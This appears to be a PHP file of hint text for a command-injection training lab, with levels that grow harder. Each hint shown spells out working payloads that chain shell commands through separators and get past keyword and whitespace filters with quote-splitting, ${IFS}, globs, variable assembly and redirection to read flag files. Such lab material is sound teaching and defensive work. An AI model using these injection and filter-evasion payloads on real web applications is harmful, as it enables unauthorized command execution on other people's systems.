...
function get_level_hints(int $levelId): array
{
    static $hints = [
        1 => [
            ...
            '<strong>Find the flag file:</strong> the flag is written to <code>/tmp/level1_flag.txt</code> when the page loads. Read it with <code>cat</code>.',
            '<strong>Working payloads:</strong> <code>8.8.8.8; cat /tmp/level1_flag.txt</code> &nbsp;|&nbsp; <code>127.0.0.1 && cat /tmp/level1_flag.txt</code> &nbsp;|&nbsp; <code>localhost | cat /tmp/level1_flag.txt</code>',
        ],
        2 => [
            ...
            '<strong>AND operator:</strong> <code>&&</code> executes the second command <em>only if the first succeeds</em>. There is no <code>systemctl</code> binary in this image, so <code>systemctl status ...</code> always exits non-zero &mdash; <code>&amp;&amp;</code> never fires here. Knowing the first command\'s exit status is part of choosing a separator.',
            ...
            '<strong>Working payloads:</strong> <code>fakesvc || cat /tmp/level2_flag.txt</code> &nbsp;|&nbsp; <code>x | cat /tmp/level2_flag.txt</code> &nbsp;|&nbsp; <code>x %0a cat /tmp/level2_flag.txt</code> (newline). <code>&amp;&amp;</code> is <em>not</em> usable on this level &mdash; the command it depends on always fails.',
        ],
        3 => [
            ...
            '<strong>Redirection:</strong> <code>&lt;</code> needs no whitespace either &mdash; <code>/etc/passwd;cat&lt;/tmp/level3_flag.txt</code> feeds the file in on stdin. (Brace expansion <code>{cat,arg}</code> is a <em>bash</em> feature and <code>/bin/sh</code> here is <code>dash</code>, which does not implement it.)',
        ...
        4 => [
            ...
            '<strong>The file name is filtered too:</strong> <code>flag</code> is on the blocked list and <code>stripos()</code> matches it anywhere, so <code>/tmp/level4_flag.txt</code> is rejected on its own. Split the name the same way you split the command: <code>/tmp/level4_f\'\'lag.txt</code>, or glob it as <code>/tmp/level4_f?ag.txt</code>.',
            '<strong>Variable assembly and wildcards:</strong> <code>a=c;b=at;$a$b</code> builds <code>cat</code> out of pieces the filter never sees together, and the glob <code>/bin/c?t</code> matches <code>/bin/cat</code> without the literal string appearing. Both work &mdash; but only if you also disguise the word <code>flag</code> in the path.',
            '<strong>Working payloads</strong> (note that the file name is disguised in every one): <code>apache;c\'\'at${IFS}/tmp/level4_f\'\'lag.txt</code> &nbsp;|&nbsp; <code>apache;/bin/c?t${IFS}/tmp/level4_f?ag.txt</code> &nbsp;|&nbsp; <code>apache;a=ca;b=t;$a$b${IFS}/tmp/level4_f?ag.txt</code>',
        ],
        5 => [
        ...
        7 => [
            ...
            '<strong>Working approach:</strong> <code>?logfile=syslog%0anl%09/tmp/level7_flag.txt%09%23</code> — the newline starts a new shell line, <code>%09</code> is a tab (space substitute), and <code>%23</code> is <code>#</code>. Note the <strong>tab before the <code>#</code></strong>: <code>#</code> only starts a comment at the beginning of a word, so <code>...level7_flag.txt%23</code> without it just names the file <code>/tmp/level7_flag.txt#.log</code> and the read fails. <code>od%09-c</code> works too, but prints one character per column instead of the flag as a string.',
        ],
        8 => [
            ...
            '<strong>No whitespace, and no way to make one:</strong> PCRE <code>\s</code> covers space, tab, newline, CR, FF and VT, so <code>%09</code> and <code>%0a</code> are both rejected — and <code>$</code> is in pattern 1, so <code>${IFS}</code> is gone too. Brace expansion is a bash feature and <code>/bin/sh</code> here is <code>dash</code>. Your second command has to reach its argument with no word break at all: that is what <code>&lt;</code> redirection is for.',
            '<strong>Read the first character class again:</strong> <code>/[\&\|`\$\(\)]/i</code> lists <code>&amp;</code>, <code>|</code>, backtick, <code>$</code>, <code>(</code> and <code>)</code>. The semicolon is not in it. That is the only separator left, so everything else has to be built around it.',
            ...
            '<strong>Working payload:</strong> <code>?ports=80;nl&lt;/tmp/level8_flag.txt;</code> — <code>;</code> starts a second command, <code>&lt;</code> hands it the file with no whitespace, <code>nl</code> is not on the command word list, and the <strong>trailing <code>;</code></strong> keeps the template\'s own <code> localhost</code> from arriving as an argument. The file name survives pattern 2 because <code>\bflag\b</code> needs a non-word character before <code>f</code> and the character there is <code>_</code> — unlike level 4, whose <code>stripos()</code> filter has no notion of a boundary. <code>tac</code>, <code>od</code> and <code>strings</code> work in place of <code>nl</code>.',
        ],
        9 => [
